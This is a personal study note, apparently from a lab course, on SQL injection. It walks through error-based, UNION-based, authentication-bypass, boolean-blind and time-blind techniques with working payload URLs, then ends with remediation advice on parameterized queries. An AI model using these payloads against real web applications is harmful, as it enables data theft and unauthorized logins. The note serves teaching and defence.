- SQLi
- attack on a web apps [Relational SQL](../../Databases/Relational%20SQL.md) based database that causes malicious database queries to be executed
- web application communicates with a database using input from a user that hasn't been properly 
- when user-provided data gets included in the SQL query
- attacker can steal, alter, delete or modify data directly and gain access to every ressource and maybe also authentication data

# Example
URL (or also Input field possible): `http://URL/blog?id=1`
the server will inject the inout (e.g. query parameter) in the databases `SELECT` statement --> `SELECT * FROM blog where id=1 and private=0 LIMIT 1;`

here e.g. private 0 means that ins provides only public blog articles. We can skip that with `;--` because `;` ends a SQL statement and `--` comments the rest:
`http://URL/blog?id=1;--` --> `SELECT * FROM blog where id=1;-- and private=0 LIMIT 1;` --> `SELECT * FROM blog where id=1;`


# In-Band SQL Injection
- easiest type to detect and exploit
- same method of communication being used to exploit the vulnerability and also receive the results (vulnerability on a website page and then being able to extract data from the database to the same page)

## Error Based SQL Injection
- most useful for easily obtaining information about the database structure
- as error messages from the database are printed directly to the browser screen
- key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced. these are most commonly:
	- single apostrophes ( ' ) 
	- quotation mark ( " )

`http://URL/article?id=2` -> shows article 2

`https://URL/article?id=2"`
-> results in an error message like `SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1`


## Union-Based SQL Injection
- utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page
- most common way of extracting large amounts of data via an SQL Injection vulnerability

Example:

### 1. getting amount of columns
We try out a `UNION` Statement with a set of column names. if the amount of column names is not correct, we will get an error:
`http://URL/article?id=2 UNION SELECT 1` 
--> here we in the error, that select statements have not the same amount of numbers: `SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns`

`http://URL/article?id=2 UNION SELECT 1,2` --> same error

`http://URL/article?id=2 UNION SELECT 1,2,3` --> no error --> so we need to provide 3 columns

### 2. display SQL output in browser
often websites display only the first entry
--> because id 2 is existing it is displaying us the entry with id=2
----> we can use e.g. 0 instead because 0 is not an existing id, so that the web app displays our SQL output:
`http://URL/article?id=0 UNION SELECT 1,2,3`


### 3. getting database name

`http://URL/article?id=0 UNION SELECT 1,2,database()`
output: `sqli_one`

### 4. getting all table names

`http://URL/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
output: `article,staff_users`

`group_concat` gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas, because the web app is displaying only one result in this example

### 5. getting table columns

`http://URL/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
output: `id,username,password`


### 6. getting table content

`http://URL/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
output: 
```
admin:p4ssword  
martin:pa$$word  
jim:work123
```

`:` and `<br>` for better readability




# Blind SQL Injection
- just a little to no feedback to confirm whether our injected queries were successful or not, because the error messages have been disabled, but the injection still works

## Authentication Bypass Blind
- most straightforward Blind SQL Injection techniques
- bypassing authentication methods such as login forms
- not interested in retrieving data from the database, just want to get past the login

Login Forms that are connected to a database of users: Web Apps are often not interested in the username and password.
The database is just looking if there is a matching entry for a row with a combination of username and password.
Here the DB is just returning true or false
--> so we just need to inject a db query which returns true or false:

how our input is inserted in the query:
`select * from users where username='USERNAME' and password='PASSWORD' LIMIT 1;`

Here we could just provide `' OR 1=1;--` in the password field because 1=1 is always true and we skip the rest. --> `select * from users where username='USERNAME' and password='' OR 1=1;--' LIMIT 1;` -- > `select * from users where username='USERNAME' and password='' OR 1=1;`


## Boolean Based Blind
- the backend injects user input in a query but is returning only a boolean to the client if an entry was found or not (does not have to be a real boolean. can also be an error message if an account names exists or nor)
- in this case we can use `like '%'` wildcard and test a lot of examples if we get the true or false based message:

Example:
`http://URL/checkuser?username=admin` --> which displays a message "username already taken"
`http://URL/checkuser?username=admin123` --> which displays a message "username not taken"
in this example the query looks like this: `select * from users where username = 'USERNAME' LIMIT 1;` --> if no entry was found, the backend returns message "username not taken" otherwise "username already taken"

with `USERNAME' UNION SELECT ...;--` we can trick the query
--> we will use admin123 because that returned false. And. we wanna try to get any other result to true. so the part with the username should return no entries

### 1. getting amount of columns
We try out a `UNION` Statement with a set of column names. if the amount of column names is not correct, we will get false:
`http://URL/checkuser?username=admin123' UNION SELECT 1;--`
--> returns false

`http://URL/checkuser?username=admin123' UNION SELECT 1,2;--` --> again false

`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3;--` --> true --> so we need to provide 3 columns


### 2. getting database name

`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like '%';--` --> true, because wildcard with just `%`is always true
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'a%';--` --> false --> try out more
...
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 's%';--` --> true --> brute force
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sa%';--` --> false
...
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sq%';--` --> true
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sqa%';--` --> false
...
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--` --> true
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 where database() = 'sqli_three';--` --> true --> database name is `sqli_three`

### 3. getting all table names

`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--` --> false
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'b%';--` --> false
...
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--` --> true
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'ua%';--` --> false
...
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users%';--` --> true
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name =like= 'users';--` --> true --> table name `users` 

### 4. getting table columns

`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';--` --> false
`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'b%' and COLUMN_NAME !='id';--`

--> brute forcing that will result in 3 columns: `id`, `username` and `password`


### 5. getting usernames

`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'a%';--`  --> true

--> brute forcing that will result in 4 usernames: `admin`, `max`, ...

### 6. getting admins password

`http://URL/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--'` --> false

--> brute forcing that will result in admin password


## Time Based Blind
- similar too boolean based
- no visual outputs of the query result
- but indicator of a correct query is the time based on how long it takes to complete
- delay by built in function `SLEEP()` alongside the `UNION` statement --> the sleep function will only get executed when the union statement is successful

 so getting the right amount columns (see [1. getting amount of columns](SQL%20Injection.md#1.%20getting%20amount%20of%20columns)) would look like this:

`http://URL/checkuser?username=admin123' UNION SELECT SLEEP(5);--` --> if there was now delay, the query was unsuccessful
`http://URL/checkuser?username=admin123' UNION SELECT SLEEP(5),2;--` --> no delay --> unsuccessful
`http://URL/checkuser?username=admin123' UNION SELECT SLEEP(5),2,3;--` --> 5 seconds delay --> successful --> 3 columns required for union statement

next steps would be äquivalent to [Boolean Based Blind](SQL%20Injection.md#Boolean%20Based%20Blind)

... so:
`http://URL/checkuser?username=admin123' UNION SELECT SLEEP(5),2,3 where database() like 'a%';--`

etc...


# Out-Band SQL Injection
- two different communication channels
	- launch the attack (e.g. web request)
	- gather the results (e.g. monitoring HTTP/DNS requests made to a service controlled by a hacker)
- not that common, because it depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query

1. hacker makes a request to a website vulnerable to SQL injection with an injection payload
2. website makes an SQL query to the database which passes the payload
3. payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database

# Remediation: How to prevent SQL Injection

- Prepared Statements (With Parameterized Queries)
	- simple to write, and easier to understand than dynamic queries
	- Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later
		- first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure
	- This coding style allows the database to distinguish between code and data, regardless of what user input is supplied
	- Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker
	- example: if an attacker were to enter the userID of `admin' or '1'='1`, the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string `tom' or '1'='1`
- Input Validation (with Allow-list)

